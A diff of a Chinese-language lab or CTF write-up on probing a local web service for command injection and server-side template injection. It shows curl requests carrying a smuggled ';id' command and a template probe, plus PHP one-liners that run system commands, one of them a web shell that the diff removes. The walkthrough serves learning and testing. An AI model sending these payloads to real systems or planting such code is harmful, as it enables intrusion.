@@ -103,7 +103,7 @@ curl -G --data-urlencode 'ip=192.168.5.3' http://127.0.0.1:7092
 curl -G --data-urlencode 'ip=192.168.5.3;id' http://127.0.0.1:7092
 ```
 
-执行报错，绕不过去，在看看有没有 SSTI：
+执行报错，绕不过去，在看看有没有 SSTI (因为看到页面上有输入信息的回显信息，这种情况下可能有模板使用的情况)：
 
 ```
 curl -G --data-urlencode "ip={{7*'7'}}" http://127.0.0.1:7092
@@ -142,10 +142,8 @@ if not ip_address:
 
 subprocess.check_output 后面接的是参数，会当成一个整体，所以不能用;号分割。<?php system('whoami');?>
 
-也可以用这个网站 https://cheatsheet.hackmanit.de/template-injection-table/ 按顺序输入各种 payload，然后根据返回结果，就可以进一步判断使用的是那种模板引擎。推荐测试：
+也可以用这个网站检测 SSTI https://cheatsheet.hackmanit.de/template-injection-table/ 按顺序输入各种 payload，然后根据返回结果，就可以进一步判断使用的是那种模板引擎。推荐测试：
 
 ```
 {{1in[1]}}
-
-<?php system($_GET[1]); ?>
 ```
